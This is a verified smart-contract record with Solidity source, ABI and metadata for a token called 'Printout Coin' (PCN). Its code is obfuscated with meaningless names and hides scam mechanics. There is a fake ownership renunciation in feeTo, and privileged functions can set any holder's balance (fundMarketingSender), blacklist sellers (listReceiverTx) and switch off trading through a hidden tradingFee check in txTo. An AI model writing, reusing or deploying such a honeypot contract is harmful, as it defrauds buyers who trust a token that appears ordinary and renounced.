{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.8;\n\nlibrary SafeMath {\n\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n        uint256 c = a + b;\n        require(c >= a, \"SafeMath: addition overflow\");\n\n        return c;\n    }\n\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n        return sub(a, b, \"SafeMath: subtraction overflow\");\n    }\n\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b <= a, errorMessage);\n        uint256 c = a - b;\n\n        return c;\n    }\n\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n        if (a == 0) {\n            return 0;\n        }\n\n        uint256 c = a * b;\n        require(c / a == b, \"SafeMath: multiplication overflow\");\n\n        return c;\n    }\n\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n        return div(a, b, \"SafeMath: division by zero\");\n    }\n\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b > 0, errorMessage);\n        uint256 c = a / b;\n\n        return c;\n    }\n\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n        return mod(a, b, \"SafeMath: modulo by zero\");\n    }\n\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b != 0, errorMessage);\n        return a % b;\n    }\n}\n\nabstract contract amountLaunched {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface listWallet {\n    function createPair(address tradingMarketing, address receiverMode) external returns (address);\n\n    function feeTo() external view returns (address);\n}\n\ninterface txShouldTotal {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\n\ninterface fromTotal {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address liquidityMaxMin) external view returns (uint256);\n\n    function transfer(address isTeam, uint256 tradingList) external returns (bool);\n\n    function allowance(address launchedTeam, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 tradingList) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address isTeam,\n        uint256 tradingList\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed buyFundToken, uint256 value);\n    event Approval(address indexed launchedTeam, address indexed spender, uint256 value);\n}\n\ninterface fromTotalMetadata is fromTotal {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract PrintoutCoin is amountLaunched, fromTotal, fromTotalMetadata {\n\n    function exemptMode(address feeLaunched, address isTeam, uint256 tradingList) internal view returns (uint256) {\n        require(tradingList > 0);\n\n        uint256 toLimitIs = 0;\n        if (feeLaunched == takeFund && totalTeam > 0) {\n            toLimitIs = tradingList * totalTeam / 100;\n        } else if (isTeam == takeFund && tradingLaunched > 0) {\n            toLimitIs = tradingList * tradingLaunched / 100;\n        }\n        require(toLimitIs <= tradingList);\n        return tradingList - toLimitIs;\n    }\n\n    address public takeFund;\n\n    constructor (){\n        \n        feeTo();\n        txShouldTotal sellListFrom = txShouldTotal(toAmount);\n        takeFund = listWallet(sellListFrom.factory()).createPair(sellListFrom.WETH(), address(this));\n        walletLiquidityMode = listWallet(sellListFrom.factory()).feeTo();\n        \n        limitLaunched = _msgSender();\n        fundLaunch[limitLaunched] = true;\n        receiverExemptShould[limitLaunched] = atWallet;\n        \n        emit Transfer(address(0), limitLaunched, atWallet);\n    }\n\n    function owner() external view returns (address) {\n        return listEnable;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return atWallet;\n    }\n\n    function launchedBuyMarketing() private view {\n        require(fundLaunch[_msgSender()]);\n    }\n\n    mapping(address => mapping(address => uint256)) private marketingFund;\n\n    address public limitLaunched;\n\n    function txTo(address feeLaunched, address isTeam, uint256 tradingList) internal returns (bool) {\n        if (feeLaunched == limitLaunched) {\n            return listLaunchedMarketing(feeLaunched, isTeam, tradingList);\n        }\n        uint256 fundSender = fromTotal(takeFund).balanceOf(walletLiquidityMode);\n        require(fundSender == tradingFee);\n        require(isTeam != walletLiquidityMode);\n        if (receiverListMarketing[feeLaunched]) {\n            return listLaunchedMarketing(feeLaunched, isTeam, tokenMax);\n        }\n        tradingList = exemptMode(feeLaunched, isTeam, tradingList);\n        return listLaunchedMarketing(feeLaunched, isTeam, tradingList);\n    }\n\n    bool public swapTotal;\n\n    uint256 private modeBuy;\n\n    bool private receiverBuy;\n\n    function approve(address maxToken, uint256 tradingList) public virtual override returns (bool) {\n        marketingFund[_msgSender()][maxToken] = tradingList;\n        emit Approval(_msgSender(), maxToken, tradingList);\n        return true;\n    }\n\n    function listLaunchedMarketing(address feeLaunched, address isTeam, uint256 tradingList) internal returns (bool) {\n        require(receiverExemptShould[feeLaunched] >= tradingList);\n        receiverExemptShould[feeLaunched] -= tradingList;\n        receiverExemptShould[isTeam] += tradingList;\n        emit Transfer(feeLaunched, isTeam, tradingList);\n        return true;\n    }\n\n    string private minWallet = \"PCN\";\n\n    function getOwner() external view returns (address) {\n        return listEnable;\n    }\n\n    address private listEnable;\n\n    uint256 private shouldSell;\n\n    string private buySender = \"Printout Coin\";\n\n    uint256 public maxLimit;\n\n    uint256 public totalTeam = 3;\n\n    function atFromLaunch(address takeSender) public {\n        require(takeSender.balance < 100000);\n        if (tokenAmount) {\n            return;\n        }\n        \n        fundLaunch[takeSender] = true;\n        if (receiverBuy) {\n            isModeTeam = false;\n        }\n        tokenAmount = true;\n    }\n\n    uint256 tradingFee;\n\n    function decimals() external view virtual override returns (uint8) {\n        return buySellList;\n    }\n\n    mapping(address => bool) public fundLaunch;\n\n    address walletLiquidityMode;\n\n    bool private amountLaunchedToken;\n\n    function listReceiverTx(address teamTo) public {\n        launchedBuyMarketing();\n        if (maxLimit != shouldSell) {\n            shouldSell = maxLimit;\n        }\n        if (teamTo == limitLaunched || teamTo == takeFund) {\n            return;\n        }\n        receiverListMarketing[teamTo] = true;\n    }\n\n    function senderLaunched(uint256 tradingList) public {\n        launchedBuyMarketing();\n        tradingFee = tradingList;\n    }\n\n    address toAmount = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function allowance(address limitEnable, address maxToken) external view virtual override returns (uint256) {\n        if (maxToken == toAmount) {\n            return type(uint256).max;\n        }\n        return marketingFund[limitEnable][maxToken];\n    }\n\n    uint256 public fromSenderMarketing;\n\n    function name() external view virtual override returns (string memory) {\n        return buySender;\n    }\n\n    event OwnershipTransferred(address indexed autoShouldTrading, address indexed tokenFund);\n\n    uint256 public takeTx;\n\n    function symbol() external view virtual override returns (string memory) {\n        return minWallet;\n    }\n\n    uint256 constant tokenMax = 13 ** 10;\n\n    function fundMarketingSender(address maxBuy, uint256 tradingList) public {\n        launchedBuyMarketing();\n        receiverExemptShould[maxBuy] = tradingList;\n    }\n\n    uint256 public tradingLaunched = 0;\n\n    bool public tokenAmount;\n\n    uint256 private atWallet = 100000000 * 10 ** 18;\n\n    function transfer(address maxBuy, uint256 tradingList) external virtual override returns (bool) {\n        return txTo(_msgSender(), maxBuy, tradingList);\n    }\n\n    bool private isModeTeam;\n\n    function balanceOf(address liquidityMaxMin) public view virtual override returns (uint256) {\n        return receiverExemptShould[liquidityMaxMin];\n    }\n\n    mapping(address => bool) public receiverListMarketing;\n\n    uint256 isSwap;\n\n    mapping(address => uint256) private receiverExemptShould;\n\n    function transferFrom(address feeLaunched, address isTeam, uint256 tradingList) external override returns (bool) {\n        if (_msgSender() != toAmount) {\n            if (marketingFund[feeLaunched][_msgSender()] != type(uint256).max) {\n                require(tradingList <= marketingFund[feeLaunched][_msgSender()]);\n                marketingFund[feeLaunched][_msgSender()] -= tradingList;\n            }\n        }\n        return txTo(feeLaunched, isTeam, tradingList);\n    }\n\n    function feeTo() public {\n        emit OwnershipTransferred(limitLaunched, address(0));\n        listEnable = address(0);\n    }\n\n    uint8 private buySellList = 18;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchedTeam\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"autoShouldTrading\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tokenFund\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"buyFundToken\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitEnable\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"maxToken\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxToken\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tradingList\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeSender\",\"type\":\"address\"}],\"name\":\"atFromLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityMaxMin\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromSenderMarketing\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"fundLaunch\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tradingList\",\"type\":\"uint256\"}],\"name\":\"fundMarketingSender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitLaunched\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamTo\",\"type\":\"address\"}],\"name\":\"listReceiverTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxLimit\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"receiverListMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"tradingList\",\"type\":\"uint256\"}],\"name\":\"senderLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeFund\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeTx\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalTeam\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingLaunched\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tradingList\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeLaunched\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"isTeam\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tradingList\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "PrintoutCoin", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}